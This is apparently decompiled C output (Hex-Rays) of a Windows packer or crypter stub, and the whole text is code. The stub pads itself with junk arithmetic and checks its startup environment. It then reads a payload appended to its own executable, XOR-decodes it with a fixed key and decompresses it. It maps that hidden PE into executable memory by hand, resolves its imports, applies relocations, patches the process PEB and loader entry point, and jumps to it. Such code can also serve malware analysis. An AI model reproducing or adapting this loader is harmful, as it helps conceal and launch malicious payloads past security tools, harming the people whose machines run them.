/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

int __cdecl sub_401060(int, int, int);
void __cdecl sub_4010A0(char *, int, unsigned int);
int __cdecl sub_4011B0(int *, char *);
HANDLE __cdecl sub_401210(LPCSTR lpFileName);
int __cdecl sub_401250(int, char, int);
// int __userpurge start@<eax>(int@<ebx>, int@<edi>, int@<esi>, HMODULE, int, int);
int __cdecl sub_4018C0(int);
int __stdcall sub_401A90(int);
int __cdecl sub_401FC0(int, int);
int __cdecl sub_402030(int);
BOOL __cdecl sub_402060(LPVOID lpMem);
LPVOID __cdecl sub_402090(SIZE_T dwBytes);

//-------------------------------------------------------------------------
// Data declarations

// extern HANDLE (__stdcall *CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern void (__stdcall __noreturn *ExitProcess)(UINT uExitCode);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern BOOL (__stdcall *ReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// extern DWORD (__stdcall *SetFilePointer)(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod);
// extern DWORD (__stdcall *GetFileSize)(HANDLE hFile, LPDWORD lpFileSizeHigh);
// extern DWORD (__stdcall *GetModuleFileNameA)(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// extern void (__stdcall *GetStartupInfoA)(LPSTARTUPINFOA lpStartupInfo);
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern BOOL (__stdcall *HeapFree)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
// extern HANDLE (__stdcall *GetProcessHeap)();
// extern LPVOID (__stdcall *HeapAlloc)(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
// extern LPVOID (__stdcall *VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// extern BOOL (__stdcall *VirtualFree)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
// extern BOOL (__stdcall *UnmapViewOfFile)(LPCVOID lpBaseAddress);
// extern LPVOID (__stdcall *MapViewOfFileEx)(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap, LPVOID lpBaseAddress);
// extern HANDLE (__stdcall *CreateFileMappingA)(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCSTR lpName);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern ATOM (__stdcall *RegisterClassA)(const WNDCLASSA *lpWndClass);
_UNKNOWN loc_4017D6; // weak
char aDyegdgujkdkq[13] = "dyegdgujkdkq"; // weak
int dword_403010 = 0; // weak
int dword_403014 = 0; // weak
int dword_403018 = 0; // weak
LPCVOID lpAddress = NULL; // idb
int dword_403020 = 0; // weak
int dword_403024 = 0; // weak
LPVOID lpMem = NULL; // idb
int dword_40302C = 0; // weak
int dword_403030 = 0; // weak
int dword_403034 = 0; // weak
int dword_403038 = 0; // weak
int dword_40303C = 0; // weak
int (__stdcall *dword_403040)(_DWORD, _DWORD, _DWORD) = NULL; // weak
int dword_403044 = 0; // weak


//----- (00401060) --------------------------------------------------------
int __cdecl sub_401060(int a1, int a2, int a3)
{
  int result; // eax
  int i; // [esp+Ch] [ebp-8h]

  for ( i = 0; i < a3; ++i )
  {
    *(_BYTE *)(i + a1) = *(_BYTE *)(i + a2);
    result = i + 1;
  }
  return result;
}

//----- (004010A0) --------------------------------------------------------
void __cdecl sub_4010A0(char *a1, int a2, unsigned int a3)
{
  int v3; // eax
  int v4; // eax
  int v5[3]; // [esp+Ch] [ebp-28h] BYREF
  unsigned int i; // [esp+18h] [ebp-1Ch]
  int v7; // [esp+1Ch] [ebp-18h]
  char v8; // [esp+23h] [ebp-11h]
  unsigned int v9; // [esp+24h] [ebp-10h] BYREF
  unsigned int v10; // [esp+2Ch] [ebp-8h]
  char v11; // [esp+33h] [ebp-1h]

  if ( a3 )
  {
    v8 = *a1;
    v10 = 1;
    v7 = 0;
    do
    {
      v11 = a1[v10++];
      if ( v11 == v8 )
      {
        if ( a1[v10] )
        {
          v3 = sub_4011B0((int *)&v9, &a1[v10]);
          v10 += v3;
          v4 = sub_4011B0(v5, &a1[v10]);
          v10 += v4;
          for ( i = 0; i < v9; ++i )
          {
            *(_BYTE *)(v7 + a2) = *(_BYTE *)(a2 + v7 - v5[0]);
            ++v7;
          }
        }
        else
        {
          *(_BYTE *)(v7 + a2) = v8;
          ++v7;
          ++v10;
        }
      }
      else
      {
        *(_BYTE *)(v7 + a2) = v11;
        ++v7;
      }
    }
    while ( v10 < a3 );
  }
}
// 4010A0: using guessed type int var_28[3];

//----- (004011B0) --------------------------------------------------------
int __cdecl sub_4011B0(int *a1, char *a2)
{
  int v3; // [esp+4h] [ebp-28h]
  char v4; // [esp+10h] [ebp-1Ch]
  int v5; // [esp+24h] [ebp-8h]

  v5 = 0;
  v3 = 0;
  do
  {
    v4 = *a2++;
    v5 = v4 & 0x7F | (v5 << 7);
    ++v3;
  }
  while ( (v4 & 0x80) != 0 );
  *a1 = v5;
  return v3;
}

//----- (00401210) --------------------------------------------------------
HANDLE __cdecl sub_401210(LPCSTR lpFileName)
{
  HANDLE FileA; // [esp+Ch] [ebp-10h]

  FileA = CreateFileA(lpFileName, 0x80000000, 1u, 0, 3u, 0x80u, 0);
  if ( FileA == (HANDLE)-1 )
    return 0;
  else
    return FileA;
}

//----- (00401250) --------------------------------------------------------
int __cdecl sub_401250(int a1, char a2, int a3)
{
  int result; // eax
  int i; // [esp+Ch] [ebp-8h]

  for ( i = 0; i < a3; ++i )
  {
    *(_BYTE *)(i + a1) = a2;
    result = i + 1;
  }
  return result;
}

//----- (00401290) --------------------------------------------------------
int __userpurge start@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>, HMODULE a4, int a5, int a6)
{
  DWORD FileSize; // eax
  HMODULE ModuleHandleA; // eax
  SIZE_T dwBytes; // [esp+Ch] [ebp-C0h]
  unsigned int v10; // [esp+10h] [ebp-BCh]
  WNDCLASSA WndClass; // [esp+14h] [ebp-B8h] BYREF
  LPSTR lpFilename; // [esp+40h] [ebp-8Ch]
  HMODULE v13; // [esp+44h] [ebp-88h]
  DWORD nNumberOfBytesToRead; // [esp+48h] [ebp-84h]
  DWORD NumberOfBytesRead; // [esp+4Ch] [ebp-80h] BYREF
  LPVOID lpBuffer; // [esp+50h] [ebp-7Ch]
  struct _STARTUPINFOA StartupInfo; // [esp+54h] [ebp-78h] BYREF
  HMODULE hModule; // [esp+A0h] [ebp-2Ch]
  int v19; // [esp+A4h] [ebp-28h]
  int v20; // [esp+ACh] [ebp-20h]
  HANDLE hFile; // [esp+B0h] [ebp-1Ch]
  int v22; // [esp+B4h] [ebp-18h]
  int v23; // [esp+B8h] [ebp-14h]
  int v24; // [esp+BCh] [ebp-10h]
  char *i; // [esp+C0h] [ebp-Ch]
  int v26; // [esp+C4h] [ebp-8h]
  LONG lDistanceToMove; // [esp+C8h] [ebp-4h]
  int savedregs; // [esp+CCh] [ebp+0h] BYREF

  v23 = 967864 * dword_403044;
  WndClass.style = 0;
  WndClass.lpfnWndProc = (WNDPROC)start;
  dword_403030 = 393525 << (-3 * dword_403034);
  WndClass.cbClsExtra = 0;
  dword_403044 = (967864 * dword_403044 + 357971) >> ((322753 << dword_403034 << v24) + dword_403014);
  WndClass.cbWndExtra = 0;
  WndClass.hInstance = GetModuleHandleA(0);
  memset(&WndClass.hIcon, 0, 16);
  dword_403034 = v23 + 868682;
  v20 = v23 >> dword_403014 >> v23 >> 24;
  v23 = ((dword_403044 << (dword_403030 - 82)) - v24) >> (v23 + dword_403044);
  v26 = dword_403014 + dword_403030;
  WndClass.lpszClassName = aDyegdgujkdkq;
  dword_403030 = (dword_403034 + 922912 * (dword_403014 + dword_403030)) >> (dword_403014 + dword_403030);
  RegisterClassA(&WndClass);
  dword_403034 = (dword_403030 * dword_403044 + 521148) << dword_403030;
  if ( a5 == 1 )
  {
    dword_40302C = 1;
    lpAddress = a4;
  }
  else
  {
    dword_40302C = 0;
  }
  dword_403034 = 56304 * dword_403014;
  v20 = 0;
  if ( dword_40302C )
    hModule = a4;
  else
    hModule = GetModuleHandleA(0);
  v13 = hModule;
  dword_403014 = 124421 * v23;
  v19 = (int)hModule + *((_DWORD *)hModule + 15);
  dword_403014 = v24 - 176148;
  sub_401250((int)&StartupInfo, 0, 68);
  StartupInfo.cb = 68;
  StartupInfo.lpDesktop = 0;
  v20 = 768676 * dword_403014;
  GetStartupInfoA(&StartupInfo);
  if ( !StartupInfo.lpDesktop )
    return 0;
  dword_403044 = 513702 >> (-13 - v23 * v26);
  v24 = (dword_403044 + v20) << dword_403034 << v26;
  v22 = v19 + *(unsigned __int16 *)(v19 + 20) + 24;
  v22 += 40 * (*(unsigned __int16 *)(v19 + 6) - 1);
  lDistanceToMove = *(_DWORD *)(v22 + 20)
                  + *(_DWORD *)(v19 + 60)
                  * ((unsigned int)(*(_DWORD *)(v22 + 16) + *(_DWORD *)(v19 + 60) - 1)
                   / *(_DWORD *)(v19 + 60));
  lpFilename = (LPSTR)sub_402090(0x200u);
  if ( !lpFilename )
    return 0;
  GetModuleFileNameA(hModule, lpFilename, 0x200u);
  hFile = sub_401210(lpFilename);
  if ( !hFile )
    return 0;
  FileSize = GetFileSize(hFile, 0);
  nNumberOfBytesToRead = FileSize - lDistanceToMove;
  if ( FileSize == lDistanceToMove )
    return 0;
  lpBuffer = sub_402090(nNumberOfBytesToRead + 16);
  if ( !lpBuffer )
    return 0;
  SetFilePointer(hFile, lDistanceToMove, 0, 0);
  if ( !ReadFile(hFile, lpBuffer, nNumberOfBytesToRead, &NumberOfBytesRead, 0) )
    return 0;
  if ( NumberOfBytesRead != nNumberOfBytesToRead )
    return 0;
  CloseHandle(hFile);
  if ( NumberOfBytesRead != nNumberOfBytesToRead )
    return 0;
  sub_401060((int)lpBuffer, (int)lpBuffer + nNumberOfBytesToRead - 64, 64);
  v10 = *(_DWORD *)lpBuffer;
  dwBytes = *((_DWORD *)lpBuffer + 1);
  for ( i = 0; (unsigned int)i < v10; i += 8 )
    *(_DWORD *)((char *)lpBuffer + (_DWORD)i + 8) ^= 0x10F447u;
  lpMem = sub_402090(dwBytes);
  if ( !lpMem )
    ExitProcess(0x826438u);
  sub_4010A0((char *)lpBuffer + 8, (int)lpMem, v10);
  i = (char *)&loc_4017D6;
  dword_40303C = (int)NtCurrentTeb();
  dword_403018 = a2;
  dword_403010 = a3;
  dword_403024 = a1;
  dword_403020 = (int)&savedregs;
  if ( dword_40302C )
  {
    sub_4018C0(i - (_BYTE *)lpAddress);
  }
  else
  {
    ModuleHandleA = GetModuleHandleA(0);
    sub_4018C0(i - (char *)ModuleHandleA);
  }
  if ( !sub_401A90((int)lpMem) )
  {
    sub_402060(lpMem);
    ExitProcess(0x86494u);
  }
  dword_403034 = 635711 >> (-19 - ((dword_403044 + 845123) >> v24)) >> 26;
  return dword_403040(a4, a5, a6);
}
// 403010: using guessed type int dword_403010;
// 403014: using guessed type int dword_403014;
// 403018: using guessed type int dword_403018;
// 403020: using guessed type int dword_403020;
// 403024: using guessed type int dword_403024;
// 40302C: using guessed type int dword_40302C;
// 403030: using guessed type int dword_403030;
// 403034: using guessed type int dword_403034;
// 40303C: using guessed type int dword_40303C;
// 403040: using guessed type int (__stdcall *dword_403040)(_DWORD, _DWORD, _DWORD);
// 403044: using guessed type int dword_403044;

//----- (004018C0) --------------------------------------------------------
int __cdecl sub_4018C0(int a1)
{
  HMODULE ModuleHandleA; // [esp+4h] [ebp-34h]
  _DWORD *v3; // [esp+8h] [ebp-30h]
  int v4; // [esp+Ch] [ebp-2Ch]
  SIZE_T *v5; // [esp+10h] [ebp-28h]
  unsigned int v6; // [esp+18h] [ebp-20h]
  _DWORD *i; // [esp+2Ch] [ebp-Ch]
  unsigned int j; // [esp+30h] [ebp-8h]

  if ( dword_40302C )
    ModuleHandleA = (HMODULE)lpAddress;
  else
    ModuleHandleA = GetModuleHandleA(0);
  if ( !ModuleHandleA )
    return 0;
  v5 = (SIZE_T *)((char *)ModuleHandleA + *((_DWORD *)ModuleHandleA + 15));
  dword_403038 = (int)VirtualAlloc(0, v5[20], 0x3000u, 0x40u);
  if ( dword_403038 )
  {
    sub_401060(dword_403038, (int)ModuleHandleA, v5[20]);
    v4 = dword_403038 - (_DWORD)ModuleHandleA;
    if ( v5[41] )
    {
      for ( i = (_DWORD *)((char *)ModuleHandleA + v5[40]); i[1]; i = (_DWORD *)((char *)i + i[1]) )
      {
        v6 = (unsigned int)(i[1] - 8) >> 1;
        v3 = i + 2;
        for ( j = 0; j < v6; ++j )
        {
          if ( (int)*((unsigned __int16 *)v3 + j) >> 12 == 3 )
            *(_DWORD *)(*i + dword_403038 + (*((_WORD *)v3 + j) & 0xFFF)) += v4;
        }
      }
    }
    __asm { jmp     eax }
  }
  return 0;
}
// 40302C: using guessed type int dword_40302C;
// 403038: using guessed type int dword_403038;

//----- (00401A90) --------------------------------------------------------
int __stdcall sub_401A90(int a1)
{
  FARPROC ProcAddress; // eax
  const CHAR *j; // [esp+4h] [ebp-54h]
  _DWORD *v4; // [esp+Ch] [ebp-4Ch]
  char *v5; // [esp+10h] [ebp-48h]
  int v6; // [esp+14h] [ebp-44h]
  char *v7; // [esp+14h] [ebp-44h]
  int *v8; // [esp+1Ch] [ebp-3Ch]
  const CHAR *v9; // [esp+20h] [ebp-38h]
  unsigned int v10; // [esp+24h] [ebp-34h]
  _DWORD *v11; // [esp+30h] [ebp-28h]
  int *v12; // [esp+34h] [ebp-24h]
  const CHAR *k; // [esp+40h] [ebp-18h]
  HMODULE hModule; // [esp+44h] [ebp-14h]
  int v15; // [esp+48h] [ebp-10h]
  unsigned int i; // [esp+4Ch] [ebp-Ch]
  unsigned int m; // [esp+4Ch] [ebp-Ch]
  HANDLE hFileMappingObject; // [esp+50h] [ebp-8h]

  v6 = *(_DWORD *)(a1 + 60) + a1;
  v11 = (_DWORD *)(v6 + *(unsigned __int16 *)(v6 + 20) + 24);
  v9 = (const CHAR *)VirtualAlloc(0, *(_DWORD *)(v6 + 80), 0x3000u, 0x40u);
  if ( !v9 )
    return 0;
  sub_401060((int)v9, a1, *(_DWORD *)(a1 + 60) + 40 * *(unsigned __int16 *)(v6 + 6) + 312);
  for ( i = 0; i < *(unsigned __int16 *)(v6 + 6); ++i )
  {
    if ( v11[5] )
    {
      if ( v11[4] )
        sub_401060(
          (int)&v9[v11[3]],
          v11[5] + a1,
          *(_DWORD *)(v6 + 60) * ((unsigned int)(v11[4] + *(_DWORD *)(v6 + 60) - 1) / *(_DWORD *)(v6 + 60)));
    }
    v11 += 10;
  }
  v7 = (char *)&v9[*((_DWORD *)v9 + 15)];
  for ( j = &v9[*((_DWORD *)v7 + 32)]; *((_DWORD *)j + 4); j += 20 )
  {
    hModule = GetModuleHandleA(&v9[*((_DWORD *)j + 3)]);
    if ( !hModule )
    {
      if ( dword_40302C )
        return 0;
      hModule = LoadLibraryA(&v9[*((_DWORD *)j + 3)]);
      if ( !hModule )
        return 0;
    }
    if ( *(_DWORD *)j )
    {
      v12 = (int *)&v9[*(_DWORD *)j];
      v8 = (int *)&v9[*((_DWORD *)j + 4)];
    }
    else
    {
      v12 = (int *)&v9[*((_DWORD *)j + 4)];
      v8 = (int *)&v9[*(_DWORD *)j];
    }
    v15 = 0;
    if ( *((_DWORD *)j + 4) && *(_DWORD *)j )
      v15 = 1;
    while ( *v12 )
    {
      if ( *v12 >= 0 )
        ProcAddress = GetProcAddress(hModule, &v9[*v12 + 2]);
      else
        ProcAddress = GetProcAddress(hModule, (LPCSTR)(*v12 & 0x7FFFFFFF));
      *v12 = (int)ProcAddress;
      if ( !*v12 )
        return 0;
      if ( v15 )
        *v8 = *v12;
      ++v12;
      ++v8;
    }
  }
  if ( dword_40302C )
  {
    v5 = (char *)lpAddress - *((_DWORD *)v7 + 13);
    if ( *((_DWORD *)v7 + 41) )
    {
      for ( k = &v9[*((_DWORD *)v7 + 40)]; *((_DWORD *)k + 1); k += *((_DWORD *)k + 1) )
      {
        v10 = (unsigned int)(*((_DWORD *)k + 1) - 8) >> 1;
        v4 = k + 8;
        for ( m = 0; m < v10; ++m )
        {
          if ( (int)*((unsigned __int16 *)v4 + m) >> 12 == 3 )
            *(_DWORD *)&v9[*(_DWORD *)k + (*((_WORD *)v4 + m) & 0xFFF)] += v5;
        }
      }
    }
  }
  hFileMappingObject = CreateFileMappingA((HANDLE)0xFFFFFFFF, 0, 4u, 0, *((_DWORD *)v7 + 20), 0);
  if ( !hFileMappingObject )
    return 0;
  if ( dword_40302C )
    dword_403038 = (int)MapViewOfFileEx(hFileMappingObject, 0x22u, 0, 0, 0, (LPVOID)lpAddress);
  else
    dword_403038 = (int)MapViewOfFileEx(hFileMappingObject, 0x22u, 0, 0, 0, *((LPVOID *)v7 + 13));
  if ( dword_403038 )
    goto LABEL_66;
  if ( dword_40302C )
  {
    if ( !UnmapViewOfFile(lpAddress) && !VirtualFree((LPVOID)lpAddress, 0, 0x8000u) )
      return 0;
  }
  else if ( !UnmapViewOfFile(*((LPCVOID *)v7 + 13)) && !VirtualFree(*((LPVOID *)v7 + 13), 0, 0x8000u) )
  {
    return 0;
  }
  dword_403038 = (int)(dword_40302C ? MapViewOfFileEx(hFileMappingObject, 0x22u, 0, 0, 0, (LPVOID)lpAddress) : MapViewOfFileEx(hFileMappingObject, 0x22u, 0, 0, 0, *((LPVOID *)v7 + 13)));
  if ( !dword_403038 )
  {
    dword_403038 = (int)(dword_40302C ? VirtualAlloc((LPVOID)lpAddress, *((_DWORD *)v7 + 20), 0x3000u, 0x40u) : VirtualAlloc(*((LPVOID *)v7 + 13), *((_DWORD *)v7 + 20), 0x3000u, 0x40u));
    if ( !dword_403038 )
      return 0;
  }
LABEL_66:
  sub_401060(dword_403038, (int)v9, *((_DWORD *)v7 + 20));
  if ( dword_40302C )
    sub_401FC0((int)lpAddress, *((_DWORD *)v7 + 10) + dword_403038);
  else
    sub_402030(dword_403038);
  dword_403040 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD))(*((_DWORD *)v7 + 10) + dword_403038);
  *((_DWORD *)v7 + 10) = dword_403040;
  return 1;
}
// 40302C: using guessed type int dword_40302C;
// 403038: using guessed type int dword_403038;
// 403040: using guessed type int (__stdcall *dword_403040)(_DWORD, _DWORD, _DWORD);

//----- (00401FC0) --------------------------------------------------------
int __cdecl sub_401FC0(int a1, int a2)
{
  _DWORD *v3; // [esp+10h] [ebp-14h]

  v3 = *(_DWORD **)(*(_DWORD *)(*(_DWORD *)(dword_40303C + 48) + 12) + 12);
  do
  {
    if ( !v3 )
      return 0;
    if ( v3[6] == a1 )
    {
      v3[7] = a2;
      return 1;
    }
    v3 = (_DWORD *)*v3;
  }
  while ( v3 != *(_DWORD **)(*(_DWORD *)(*(_DWORD *)(dword_40303C + 48) + 12) + 12) );
  return 0;
}
// 40303C: using guessed type int dword_40303C;

//----- (00402030) --------------------------------------------------------
int __cdecl sub_402030(int a1)
{
  int result; // eax

  result = *(_DWORD *)(dword_40303C + 48);
  *(_DWORD *)(result + 8) = a1;
  return result;
}
// 40303C: using guessed type int dword_40303C;

//----- (00402060) --------------------------------------------------------
BOOL __cdecl sub_402060(LPVOID lpMem)
{
  HANDLE ProcessHeap; // eax

  ProcessHeap = GetProcessHeap();
  return HeapFree(ProcessHeap, 0, lpMem);
}

//----- (00402090) --------------------------------------------------------
LPVOID __cdecl sub_402090(SIZE_T dwBytes)
{
  HANDLE ProcessHeap; // eax

  ProcessHeap = GetProcessHeap();
  return HeapAlloc(ProcessHeap, 0, dwBytes);
}

// nfuncs=12 queued=12 decompiled=12 lumina nreq=0 worse=0 better=0
// ALL OK, 12 function(s) have been successfully decompiled
